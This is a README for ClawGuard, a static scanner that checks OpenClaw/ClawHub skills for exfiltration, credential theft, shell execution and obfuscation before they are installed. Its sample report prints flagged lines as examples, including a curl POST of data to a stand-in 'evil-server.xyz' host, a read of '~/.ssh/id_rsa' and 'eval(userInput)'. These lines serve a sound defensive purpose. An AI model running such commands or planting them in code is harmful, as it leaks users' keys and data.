# ClawGuard 🛡️

**Security scanner for ClawHub skills. Analyze before you install.**

ClawGuard performs static code analysis on OpenClaw/ClawHub skills to detect dangerous patterns before you install them. It checks for network exfiltration, credential theft, shell execution, file destruction, code obfuscation, and more.

## Features

- 🌐 **Network exfiltration detection** — HTTP POST to external URLs
- 🔑 **Credential access detection** — API keys, tokens, passwords
- ⚡ **Shell execution detection** — exec(), subprocess, system()
- 💥 **File destruction detection** — rm -rf, unlink, rmdir
- 🎭 **Obfuscation detection** — eval(), base64 decode
- 👻 **Hidden file detection** — Dotfiles, hidden directories
- 📊 **Risk scoring** — 0-100 weighted severity score
- 🌐 **URL extraction** — Lists all network endpoints with safety check

## Installation

### As an OpenClaw skill

```bash
# Install from ClawHub (coming soon)
clawhub install clawguard

# Or install locally
clawhub install --path /path/to/clawguard
```

### Standalone

```bash
# Clone repository
git clone https://github.com/ubik-collective/clawguard.git
cd clawguard

# Ensure uv is installed
pip install uv

# Run directly
uv run scripts/scan.py --help
```

## Usage

### Scan a skill from ClawHub

```bash
uv run scripts/scan.py --skill <skill-name>
```

Example:
```bash
uv run scripts/scan.py --skill github
```

### Scan a local directory

```bash
uv run scripts/scan.py --path /path/to/skill
```

Example:
```bash
uv run scripts/scan.py --path ~/.openclaw/skills/my-skill
```

### JSON output

```bash
uv run scripts/scan.py --skill <skill-name> --json
```

## Output Example

```
🛡️  ClawGuard Security Report
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Skill: example-skill
Score: 72/100 🔴 DANGEROUS
Files scanned: 15
Lines scanned: 2341

⚠️  Issues Found (5):

1. [HIGH] scripts/run.sh:14 — curl command to external URL
   Code: curl -X POST https://evil-server.xyz/collect -d "$DATA"

2. [HIGH] lib/helper.js:23 — Dynamic code execution (eval) - code injection risk
   Code: eval(userInput)

3. [MED]  lib/helper.js:45 — Accesses credential from environment variables
   Code: const key = process.env.OPENAI_API_KEY

4. [MED]  scripts/run.sh:8 — Reads credential files
   Code: cat ~/.ssh/id_rsa

5. [LOW]  .hidden-config — Hidden file detected: .hidden-config

🌐 Network Endpoints (2):
  ✓ https://api.openai.com (known safe)
  ⚠️ https://evil-server.xyz/collect (unknown)

📋 Recommendation:
🔴 DO NOT INSTALL — High-risk patterns detected.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

## Risk Levels

- 🟢 **SAFE (0-30)**: No significant risks detected — OK to install
- 🟡 **CAUTION (31-60)**: Review flagged items before installing
- 🔴 **DANGEROUS (61-100)**: High-risk patterns detected — DO NOT INSTALL

## Exit Codes

- `0`: Safe
- `1`: Caution  
- `2`: Dangerous

Use in scripts:
```bash
if uv run scripts/scan.py --skill some-skill; then
    echo "Safe to install"
else
    echo "Risk detected!"
fi
```

## What It Detects

| Category | Weight | Examples |
|----------|--------|---------|
| **Network exfiltration** | 25 | POST to unknown URL with encoded data |
| **Credential access** | 20 | Reading API keys, tokens, passwords |
| **Shell execution** | 15 | exec(), subprocess, system() |
| **File destruction** | 15 | rm -rf, unlink, rmdir |
| **Obfuscation** | 15 | eval(), atob(), Buffer.from base64 |
| **Hidden files** | 10 | Dotfiles, hidden directories |

## How It Works

1. **Download** (optional): Fetches skill from ClawHub to temp directory
2. **File scanning**: Walks skill directory, skips node_modules/.git
3. **Pattern matching**: Regex-based detection of dangerous patterns
4. **AST analysis**: Python AST parsing for eval/exec detection
5. **URL extraction**: Identifies all network endpoints
6. **Risk scoring**: Weighted severity scoring (0-100)
7. **Report generation**: Human-readable or JSON output
8. **Cleanup**: Removes temp directory

## Architecture

```
clawguard/
├── SKILL.md              # OpenClaw skill definition
├── README.md             # This file
├── scripts/
│   └── scan.py           # Main scanner CLI
├── lib/
│   ├── __init__.py
│   ├── patterns.py       # Risk pattern definitions
│   ├── analyzer.py       # Code analysis engine
│   ├── reporter.py       # Report generator
│   └── downloader.py     # Skill downloader (ClawHub)
└── tests/
    ├── test_patterns.py
    └── test_samples/     # Safe/dangerous test samples
        ├── safe/
        └── dangerous/
```

## Limitations

- **Static analysis only**: Cannot detect runtime behavior or dynamic code generation
- **Regex-based**: May have false positives/negatives
- **JS/TS**: Basic pattern matching (no full AST parsing to avoid dependencies)
- **Encrypted/minified code**: Cannot analyze obfuscated payloads
- **Context-blind**: Flags patterns without understanding intent

## Best Practices

1. **Always scan before installing** untrusted skills
2. **Review CAUTION-level findings** manually — not all flags are malicious
3. **Check network endpoints** for unknown domains
4. **Never install DANGEROUS skills** without manual verification
5. **Report suspicious skills** to ClawHub moderators
6. **Combine with manual review** — automated scanning is not foolproof

## Contributing

Contributions welcome! Areas for improvement:

- Additional language support (Ruby, Go, Rust)
- Full JS/TS AST parsing (tree-sitter or similar)
- Behavioral analysis patterns
- Machine learning-based detection
- ClawHub integration (auto-scan on publish)

## License

MIT License — see LICENSE file

## Credits

Developed by **UBIK Systems** for the OpenClaw ecosystem.

## Contact

- GitHub: [ubik-collective](https://github.com/ubik-collective)
- ClawHub: [clawhub.com](https://clawhub.com)

---

**Stay safe! 🛡️**
